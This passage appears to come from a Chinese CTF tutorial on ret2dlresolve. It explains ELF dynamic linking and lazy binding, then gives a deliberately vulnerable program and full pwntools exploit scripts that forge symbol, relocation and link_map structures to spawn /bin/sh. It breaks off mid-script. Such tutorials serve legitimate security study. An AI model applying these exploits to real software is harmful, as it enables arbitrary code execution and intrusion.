<li><p><code>.dynsym</code>：是一个符号表（结构体数组），该节保存了引用外部文件的符号，每一个结构体都对应一个符号，只能在运行时被解析，索引值从0开始计数，值为0的表项不具有实际的意义，表示未定义的符号，在IDA里面如下图所示：</p>
<p><img src="https://s1.ax1x.com/2022/10/17/xD0xgg.png" alt=".dynsym"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">   <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">   &#123;</span></span><br><span class="line">     Elf32_Word	st_name;		<span class="comment">/* Symbol name (string tbl index) */</span>	<span class="comment">// 相对于.dynstr 段头的偏移</span></span><br><span class="line">     Elf32_Addr	st_value;		<span class="comment">/* Symbol value */</span></span><br><span class="line">     Elf32_Word	st_size;		<span class="comment">/* Symbol size */</span></span><br><span class="line">     <span class="type">unsigned</span> <span class="type">char</span>	st_info;		<span class="comment">/* Symbol type and binding */</span>			<span class="comment">// 一般函数为 0x12</span></span><br><span class="line">     <span class="type">unsigned</span> <span class="type">char</span>	st_other;		<span class="comment">/* Symbol visibility */</span></span><br><span class="line">     Elf32_Section	st_shndx;		<span class="comment">/* Section index */</span></span><br><span class="line">   &#125; Elf32_Sym;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">   &#123;</span></span><br><span class="line">     Elf64_Word	st_name;		<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">     <span class="type">unsigned</span> <span class="type">char</span>	st_info;		<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">     <span class="type">unsigned</span> <span class="type">char</span> st_other;		<span class="comment">/* Symbol visibility */</span></span><br><span class="line">     Elf64_Section	st_shndx;		<span class="comment">/* Section index */</span></span><br><span class="line">     Elf64_Addr	st_value;		<span class="comment">/* Symbol value */</span></span><br><span class="line">     Elf64_Xword	st_size;		<span class="comment">/* Symbol size */</span></span><br><span class="line">   &#125; Elf64_Sym;</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> `.rel.plt`：一个重定位表（其中`.rela.plt`是函数的重定位表），重定位是连接符号定义与符号引用的过程，简单来说，重定位需要把节中的符号引用转换成这些符号在进程空间的虚拟地址，在IDA如下图所示：</span><br><span class="line"></span><br><span class="line">   ![.rel.plt](https:<span class="comment">//s1.ax1x.com/2022/10/17/xDBk5V.png)</span></span><br><span class="line"></span><br><span class="line">   ```c</span><br><span class="line">   <span class="comment">/* Relocation table entry without addend (in section of type SHT_REL).  */</span></span><br><span class="line">   </span><br><span class="line">   <span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">   &#123;</span><br><span class="line">     Elf32_Addr	r_offset;		<span class="comment">/* Address */</span>	<span class="comment">// 保存解析后的符号地址写入内存的位置，一般指的就是 got</span></span><br><span class="line">     Elf32_Word	r_info;			<span class="comment">/* Relocation type and symbol index */</span>	</span><br><span class="line">       <span class="comment">// r_info 高3位用于标识该符号在 .dynsym 段中的位置，低位半字节对于函数来说一般是 0x7</span></span><br><span class="line">   &#125; Elf32_Rel;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">/* I have seen two different definitions of the Elf64_Rel and</span></span><br><span class="line"><span class="comment">      Elf64_Rela structures, so we&#x27;ll leave them out until Novell (or</span></span><br><span class="line"><span class="comment">      whoever) gets their act together.  */</span></span><br><span class="line">   <span class="comment">/* The following, at least, is used on Sparc v9, MIPS, and Alpha.  */</span></span><br><span class="line">   </span><br><span class="line">   <span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">   &#123;</span><br><span class="line">     Elf64_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">     Elf64_Xword	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">   &#125; Elf64_Rel;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">/* Relocation table entry with addend (in section of type SHT_RELA).  */</span></span><br><span class="line">   </span><br><span class="line">   <span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">   &#123;</span><br><span class="line">     Elf32_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">     Elf32_Word	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">     Elf32_Sword	r_addend;		<span class="comment">/* Addend */</span></span><br><span class="line">   &#125; Elf32_Rela;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">   &#123;</span><br><span class="line">     Elf64_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">     Elf64_Xword	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">     Elf64_Sxword	r_addend;		<span class="comment">/* Addend */</span></span><br><span class="line">   &#125; Elf64_Rela;</span><br></pre></td></tr></table></figure></li>
</ol>
<p>接下来了解一下延迟绑定的内容。延迟绑定的基本思想就是当函数第一次被调用时，动态链接器才进行符号查找、重定位等操作。如果未被调用则不进行绑定。ELF文件通过PLT和GOT的配合来实现延迟绑定，每个被调用的函数都有一组对应的PLT和GOT。</p>
<p>PLT是位于代码段.plt节的一个数组，每个条目占8个字节，如下所示：</p>
<ul>
<li>PLT[0]：用于跳转到动态连接器</li>
<li>PLT[1]：用于调用系统启动函数__libc_start_main()，main函数就是在这里被调用</li>
<li>PLT[2]：从这里开始就是被调用函数的条目</li>
</ul>
<p>GOT是位于数据段.got.plt节的一个数组，每个条目占8个字节，如下所示：</p>
<ul>
<li>GOT[0]：动态链接器在解析函数地址时需要的地址<code>.dynamic</code>条目</li>
<li>GOT[1]：动态链接器在解析函数地址时需要的地址<code>relor</code>条目</li>
<li>GOT[2]：动态链接器ld-linux.so的入口点，即<code>_dl_runtime_resolve</code>函数</li>
<li>GOT[3]：从这里开始就是被调用函数的条目</li>
</ul>
<p>以调用func函数为例：</p>
<ol>
<li>首先会进入func@plt，第一条指令jmp跳转到指定的GOT条目，如果没有重定位过，该位置保存的是func@plt的第二条指令。</li>
<li>执行push指令，将对应的func在<code>.rel.plt</code>中的下标压栈（<strong>这里就是之后的reloc_index</strong>），然后进入PLT[0]。</li>
<li>PLT[0]先将GOT[1]（一个<strong>link_map对象</strong>的地址）压栈，然后调用GOT[2]，即调用了<code>_dl_runtime_resolve()</code>函数。</li>
</ol>
<p>接下来就是动态解析的核心，<code>_dl_runtime_resolve()</code>函数：</p>
<p><img src="https://s1.ax1x.com/2022/10/17/xDBV8U.png" alt="符号解析"></p>
<p>这里附上E4L4师傅的流程图：</p>
<p><img src="https://s1.ax1x.com/2022/10/17/xDBnKJ.png" alt="流程图"></p>
<ol>
<li>通过<code>link_map</code>访问<code>.dynamic</code>，并取出<code>.dynstr</code>, <code>.dynsym</code>, <code>.rel.plt</code>的指针</li>
<li><code>.rel.plt</code>的地址与传入的<code>reloc_index</code>（<strong>注意是偏移</strong>）相加得到该函数的<code>Elf_Rel</code></li>
<li>通过<code>Elf_Rel</code>结构体成员<code>r_info</code>的高位（<code>rel-&gt;r_info &gt;&gt; 8</code>）得到该函数在<code>.dynsym</code>的<strong>索引</strong>，由此得到该函数的<code>Elf_Sym</code></li>
<li>通过<code>Elf_Sym</code>结构体成员<code>st_name</code>（<strong>注意是偏移</strong>）与<code>.dynstr</code>相加得到符号字符串的指针</li>
</ol>
<h2 id="利用手法"><a href="#利用手法" class="headerlink" title="利用手法"></a>利用手法</h2><p>编译采用的源码是仿照XDCTF2015的一道题写的，采用的编译器是gcc7，版本高于gcc9会减少gadget导致利用失败。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    </span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, buf);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>] = <span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, buf);</span><br><span class="line">    write(<span class="number">1</span>, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="No-RELRO"><a href="#No-RELRO" class="headerlink" title="No RELRO"></a>No RELRO</h3><p>在该种情况下.dynamic是可写的，只要修改其中的DT_STRTAB地址到我们伪造的.dynstr上，那么就可以实现任意函数的调用。</p>
<h4 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -fno-stack-protector -no-pie -z norelro -m32 pwn.c -o pwn-x86-norelro</span><br></pre></td></tr></table></figure>

<p>EXP如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./pwn-x86-norelro&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn-x86-norelro&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">strlen_push = elf.plt[<span class="string">&#x27;strlen&#x27;</span>] + <span class="number">6</span></span><br><span class="line">bss = elf.bss() + <span class="number">0x100</span></span><br><span class="line">fake_dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data().replace(<span class="string">b&#x27;strlen&#x27;</span>, <span class="string">b&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dt_strtab = <span class="number">0x08049804</span> + <span class="number">0x4</span></span><br><span class="line">ppp_r = <span class="number">0x08048629</span></span><br><span class="line"></span><br><span class="line">pld = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x70</span></span><br><span class="line">pld += flat([read_plt, ppp_r, <span class="number">0</span>, bss, <span class="number">0x200</span>,</span><br><span class="line">             read_plt, strlen_push, <span class="number">0</span>, dt_strtab, <span class="number">0x10</span>])</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">sh.send(pld)</span><br><span class="line"></span><br><span class="line">sh.send(fake_dynstr)</span><br><span class="line">sh.send(p32(bss) + <span class="string">b&#x27;;sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h4 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -fno-stack-protector -no-pie -z norelro pwn.c -o pwn-x64-norelro</span><br></pre></td></tr></table></figure>

<p>EXP如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./pwn-x64-norelro&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn-x64-norelro&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">strlen_push = elf.plt[<span class="string">&#x27;strlen&#x27;</span>] + <span class="number">6</span></span><br><span class="line">bss = elf.bss() + <span class="number">0x100</span></span><br><span class="line">fake_dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data().replace(<span class="string">b&#x27;strlen&#x27;</span>, <span class="string">b&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dt_strtab = <span class="number">0x0000000000600988</span> + <span class="number">0x8</span></span><br><span class="line">p_rdi_r = <span class="number">0x0000000000400773</span></span><br><span class="line">p_rsi_r15_r = <span class="number">0x0000000000400771</span></span><br><span class="line">ret = <span class="number">0x00000000004004c6</span></span><br><span class="line"></span><br><span class="line">pld = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x78</span></span><br><span class="line">pld += flat([p_rdi_r, <span class="number">0</span>, p_rsi_r15_r, dt_strtab, <span class="number">0</span>, read_plt,</span><br><span class="line">             p_rdi_r, <span class="number">0</span>, p_rsi_r15_r, bss, <span class="number">0</span>, read_plt,</span><br><span class="line">             p_rdi_r, bss, ret, strlen_push])</span><br><span class="line"><span class="comment"># ret to avoid movaps xmmword ptr [rsp], xmm1</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">sh.send(pld)</span><br><span class="line"></span><br><span class="line">sh.send(p64(bss + <span class="number">0x10</span>))</span><br><span class="line">sh.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>) + fake_dynstr)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="Partial-RELRO"><a href="#Partial-RELRO" class="headerlink" title="Partial RELRO"></a>Partial RELRO</h3><p>在该种情况下.dynamic是不可写的，不过我们可以控制reloc_index的值，使得我们可以伪造Elf_Rel结构体，进而可以通过r_info成员伪造Elf_Sym结构体，进而可以通过st_name成员找到我们伪造的字符串，最终实现任意函数调用。</p>
<h4 id="x86-1"><a href="#x86-1" class="headerlink" title="x86"></a>x86</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -fno-stack-protector -no-pie -z lazy -m32 pwn.c -o pwn-x86-norelro</span><br></pre></td></tr></table></figure>

<p>EXP如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level = &#x27;debug&#x27;)</span><br><span class="line">sh = process(&#x27;./pwn-x86-lazy&#x27;)</span><br><span class="line">elf = ELF(&#x27;./pwn-x86-lazy&#x27;)</span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[&#x27;read&#x27;]</span><br><span class="line">write_got = elf.got[&#x27;write&#x27;]</span><br><span class="line">bss = elf.bss() + 0x600 + 4</span><br><span class="line">plt_0 = elf.get_section_by_name(&#x27;.plt&#x27;).header.sh_addr</span><br><span class="line">rel_plt = elf.get_section_by_name(&#x27;.rel.plt&#x27;).header.sh_addr</span><br><span class="line">dynsym = elf.get_section_by_name(&#x27;.dynsym&#x27;).header.sh_addr</span><br><span class="line">dynstr = elf.get_section_by_name(&#x27;.dynstr&#x27;).header.sh_addr</span><br><span class="line"></span><br><span class="line">ppp_ret = 0x08048649</span><br><span class="line">p_ebp_r = 0x0804864b</span><br><span class="line">leave_ret = 0x08048465</span><br><span class="line"></span><br><span class="line">reloc_index = bss + 28 - rel_plt</span><br><span class="line">align = 0x10 - ((bss + 36 - dynsym) % 0x10)</span><br><span class="line">success(&#x27;align: &#x27; + hex(align))</span><br><span class="line">r_info = ((bss + 36 + align - dynsym) &lt;&lt; 4) + 0x7</span><br><span class="line">st_name = bss + 60 + align - dynstr</span><br><span class="line">fake_rel = flat(write_got,     # r_offset</span><br><span class="line">                r_info         # r_info</span><br><span class="line">                )</span><br><span class="line">fake_sym = flat(st_name,       # st_name</span><br><span class="line">                0,             # st_value</span><br><span class="line">                0,             # st_size</span><br><span class="line">                0x12,          # st_info</span><br><span class="line">                0,             # st_other</span><br><span class="line">                0              # st_shndx</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">pld = b&#x27;a&#x27; * 0x70</span><br><span class="line">pld += flat([read_plt, ppp_ret, 0, bss, 0x100,</span><br><span class="line">             p_ebp_r, bss, leave_ret])</span><br><span class="line">sh.recvuntil(&#x27;Welcome to XDCTF2015~!\n&#x27;)</span><br><span class="line">sh.send(pld)</span><br><span class="line"></span><br><span class="line">pld = flat(0,</span><br><span class="line">           plt_0,</span><br><span class="line">           reloc_index,</span><br><span class="line">           0,</span><br><span class="line">           (bss + 0xa0), 0, 0,</span><br><span class="line">           fake_rel,</span><br><span class="line">           b&#x27;\x00&#x27; * align, </span><br><span class="line">           fake_sym,</span><br><span class="line">           &#x27;execve\x00&#x27;</span><br><span class="line">           )</span><br><span class="line">pld = pld.ljust(0xa0, b&#x27;\x00&#x27;) + b&#x27;/bin/sh\x00&#x27;</span><br><span class="line">sh.send(pld)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h4 id="x64-1"><a href="#x64-1" class="headerlink" title="x64"></a>x64</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -fno-stack-protector -no-pie -z lazy pwn.c -o pwn-x64-norelro</span><br></pre></td></tr></table></figure>

<p>相比较32位的利用手法，64位需要多绕过一个检查，贴一位师傅注释的源码：</p>
<blockquote>
<p><a href="https://blog.csdn.net/qq_51868336/article/details/114644569">(14条消息) ret2dlresolve超详细教程(x86&amp;x64)_77Pray的博客-CSDN博客</a></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_dl_fixup (<span class="keyword">struct</span> link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 获取 link_map 中存放 DT_SYMTAB 的地址</span></span><br><span class="line">  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *<span class="type">const</span> symtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">    <span class="comment">// 获取 link_map 中存放 DT_STRTAB 的地址</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line">	<span class="comment">// reloc_offset 就是 reloc_arg，获取重定位表项中对应函数的结构体</span></span><br><span class="line">  <span class="type">const</span> PLTREL *<span class="type">const</span> reloc = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">    <span class="comment">// 根据重定位结构体的 r_info 得到 symtab 表中对应的结构体</span></span><br><span class="line">  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">    </span><br><span class="line">  <span class="type">void</span> *<span class="type">const</span> rel_addr = (<span class="type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">  <span class="type">lookup_t</span> result;</span><br><span class="line">  DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Sanity check that we&#x27;re really looking at a PLT relocation.  */</span></span><br><span class="line">  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT); <span class="comment">// 检查 r_info 的最低位是不是7</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">      used don&#x27;t look in the global scope.  */</span></span><br><span class="line">    <span class="comment">// 这里是一层检测，检查sym结构体中的 st_other 是否为0，正常情况下为0，执行下面代码</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>) </span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">// 这里也是一层检测，检查 link_map 中的 DT_VERSYM 是否为NULL，正常情况下不为NULL，执行下面代码</span></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">      <span class="comment">// 到了这里就是64位下报错的位置。在计算版本号时，由于我们一般伪造的symtab位于bss段，就导致在64位下 reloc-&gt;r_info 比较大，故程序会发生错误。</span></span><br><span class="line">      <span class="comment">// 第一种绕过手段就是使上一行的if不成立，也就是设置 link_map 中的 DT_VERSYM 为 NULL，那我们就要泄露出link_map的地址，而如果我们能泄露地址，根本用不着ret2dlresolve。</span></span><br><span class="line">      <span class="comment">// 第二种绕过手段就是使最外层的if不成立，也就是使sym结构体中的 st_other 不为0。</span></span><br><span class="line">	  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">	  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">	  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">	  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">	    version = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We need to keep the scope around so do some locking.  This is</span></span><br><span class="line"><span class="comment">	 not necessary for objects which cannot be unloaded or when</span></span><br><span class="line"><span class="comment">	 we are not using any threads (yet).  */</span></span><br><span class="line">      <span class="type">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">	&#123;</span><br><span class="line">	  THREAD_GSCOPE_SET_FLAG ();</span><br><span class="line">	  flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line">	<span class="comment">// 在32位情况下，上面代码运行中不会出错，就会走到这里</span></span><br><span class="line">    <span class="comment">// 这里通过 strtab + sym-&gt;st_name 找到符号表字符串，result 为libc基地址</span></span><br><span class="line">      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">				    version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We are done with the global scope.  */</span></span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">	THREAD_GSCOPE_RESET_FLAG ();</span><br><span class="line"></span><br><span class="line">      RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Currently result contains the base load address (or link map)</span></span><br><span class="line"><span class="comment">	 of the object that defines sym.  Now add in the symbol</span></span><br><span class="line"><span class="comment">	 offset.  */</span></span><br><span class="line">      <span class="comment">// 同样，如果正常执行，接下来会来到这里，得到value的值，为libc基址加上要解析函数的偏移地址，也即实际地址，即 result + st_value</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123; </span><br><span class="line">      <span class="comment">// 这里就是64位下利用的关键，在最上面的if不成立后，就会来到这里</span></span><br><span class="line">      <span class="comment">// 我们的目的是使value为我们所需要的函数的地址，所以就得控制两个参数,l_addr 和 st_value</span></span><br><span class="line">      <span class="comment">/* We already found the symbol.  The module (and therefore its load</span></span><br><span class="line"><span class="comment">	 address) is also known.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);</span><br><span class="line">      result = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* And now perhaps the relocation addend.  */</span></span><br><span class="line">  value = elf_machine_plt_value (l, reloc, value);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (sym != <span class="literal">NULL</span></span><br><span class="line">      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))</span><br><span class="line">    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Finally, fix up the plt itself.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">  <span class="comment">// 最后把value写入相应的GOT表条目中</span></span><br><span class="line">  <span class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过阅读源码，我们明确了目的：控制<code>l-&gt;l_addr</code>和<code>sym-&gt;st_value</code>的值，使得两者相加为目的函数的真实地址。</p>
<p>先看一下link_map结构体的声明：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> &#123;</span></span><br><span class="line">    Elf64_Addr l_addr;</span><br><span class="line">    <span class="type">char</span> *l_name;</span><br><span class="line">    Elf64_Dyn *l_ld;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_prev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_real</span>;</span></span><br><span class="line">    Lmid_t l_ns;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">libname_list</span> *<span class="title">l_libname</span>;</span></span><br><span class="line">    Elf64_Dyn *l_info[<span class="number">76</span>];				<span class="comment">//l_info 里面包含的就是动态链接的各个表的信息</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="type">size_t</span> l_tls_firstbyte_offset;</span><br><span class="line">    <span class="type">ptrdiff_t</span> l_tls_offset;</span><br><span class="line">    <span class="type">size_t</span> l_tls_modid;</span><br><span class="line">    <span class="type">size_t</span> l_tls_dtor_count;</span><br><span class="line">    Elf64_Addr l_relro_addr;</span><br><span class="line">    <span class="type">size_t</span> l_relro_size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> l_serial;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">auditstate</span> <span class="title">l_audit</span>[];</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>EXP如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./pwn-x64-lazy&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn-x64-lazy&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">bss = elf.bss() + <span class="number">0x100</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bss))</span><br><span class="line"></span><br><span class="line">p_rdi_r = <span class="number">0x00000000004007a3</span></span><br><span class="line">p_rsi_r15_r = <span class="number">0x00000000004007a1</span></span><br><span class="line">plt_jump_dl = <span class="number">0x0000000000400506</span></span><br><span class="line">ret = <span class="number">0x00000000004004fe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fake_linkmap_x64</span>(<span class="params">fake_linkmap_addr, func_got, offset</span>):</span><br><span class="line">    link_map = flat((offset &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>)),           <span class="comment"># l_addr</span></span><br><span class="line">                    <span class="number">0</span>,                                  <span class="comment"># l_name</span></span><br><span class="line">                    fake_linkmap_addr + <span class="number">0x18</span>,           <span class="comment"># l_ld -&gt; Elf_Rel</span></span><br><span class="line">                    bss + <span class="number">0xc4000</span>,                      <span class="comment"># l_next -&gt; Elf_Rel-&gt;r_offset, addr is writeable</span></span><br><span class="line">                    <span class="number">0x7</span>,                                <span class="comment"># l_prev -&gt; Elf_Rel-&gt;r_info</span></span><br><span class="line">                    <span class="number">0</span>,                                  <span class="comment"># l_real -&gt; Elf_Rel-&gt;r_addend</span></span><br><span class="line">                    <span class="number">0</span>,                                  <span class="comment"># l_ns</span></span><br><span class="line">                    <span class="number">0</span>,                                  <span class="comment"># l_libname</span></span><br><span class="line">                    func_got - <span class="number">0x8</span>,                     <span class="comment"># l_info -&gt; Elf_Sym</span></span><br><span class="line">                    <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">                    )</span><br><span class="line">    link_map = 